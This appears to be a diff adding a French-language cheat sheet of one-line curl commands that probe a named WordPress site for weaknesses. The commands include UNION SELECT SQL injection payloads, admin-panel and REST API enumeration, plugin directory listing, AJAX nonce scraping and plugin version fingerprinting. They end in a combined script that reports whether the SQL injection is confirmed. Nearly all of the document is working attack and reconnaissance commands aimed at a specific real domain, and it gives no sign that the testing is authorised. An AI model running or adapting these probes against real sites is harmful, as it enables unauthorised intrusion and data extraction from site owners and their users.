@@ -1,0 +1,51 @@
+# 🚀 COMMANDES RAPIDES POUR TESTS
+
+## ⚡ TESTS EN UNE LIGNE
+
+# 1. SQL Injection rapide
+curl "https://maguen-cyber.fr/?p=1%27%20UNION%20SELECT%201,2,3--"
+
+# 2. Admin panel check  
+curl -s -o /dev/null -w "%{http_code}" "https://maguen-cyber.fr/wp-admin/"
+
+# 3. API REST extraction
+curl -s "https://maguen-cyber.fr/?rest_route=/wp/v2/posts" | jq .
+
+# 4. Plugin directory listing
+curl -s "https://maguen-cyber.fr/wp-content/plugins/" | grep -i "elementor\|contact"
+
+# 5. Token AJAX présent
+curl -s "https://maguen-cyber.fr/" | grep -o "ajax_nonce.*[0-9a-f]\{10\}"
+
+## 🎯 TESTS AVEC RÉSULTATS ATTENDUS
+
+# Admin accessible (doit retourner 200)
+curl -I "https://maguen-cyber.fr/wp-admin/" | head -1
+
+# SQL injection (doit montrer structure de la réponse modifiée)  
+curl -s "https://maguen-cyber.fr/?p=1%27%20UNION%20SELECT%20%27THRONE%27,2,3--" | grep -i "throne"
+
+# API posts (doit retourner JSON avec posts)
+curl -s "https://maguen-cyber.fr/?rest_route=/wp/v2/posts" | head -20
+
+# Plugin versions (doit montrer version)
+curl -s "https://maguen-cyber.fr/wp-content/plugins/elementor/readme.txt" | grep -i "version"
+
+## 🔥 TEST ULTIMATE - TOUT EN UNE FOIS
+
+echo "🔍 TESTS RAPIDES MAGUEN-CYBER.FR"
+echo "================================"
+echo ""
+echo "1. Admin Panel:"
+curl -s -o /dev/null -w "Status: %{http_code}\n" "https://maguen-cyber.fr/wp-admin/"
+echo ""
+echo "2. SQL Injection:"  
+curl -s "https://maguen-cyber.fr/?p=1%27%20UNION%20SELECT%20%27VULNERABLE%27,2,3--" | grep -q "VULNERABLE" && echo "✅ SQL Injection CONFIRMÉE" || echo "❌ Pas d'injection"
+echo ""
+echo "3. API REST:"
+curl -s "https://maguen-cyber.fr/?rest_route=/wp/v2/posts" | jq -r 'if type == "array" then "✅ API REST OUVERTE (\(length) posts)" else "❌ API fermée" end' 2>/dev/null
+echo ""
+echo "4. Plugins:"
+curl -s "https://maguen-cyber.fr/wp-content/plugins/" | grep -q "elementor" && echo "✅ Plugins exposés" || echo "❌ Plugins protégés"
+echo ""
+echo "Tests terminés !"
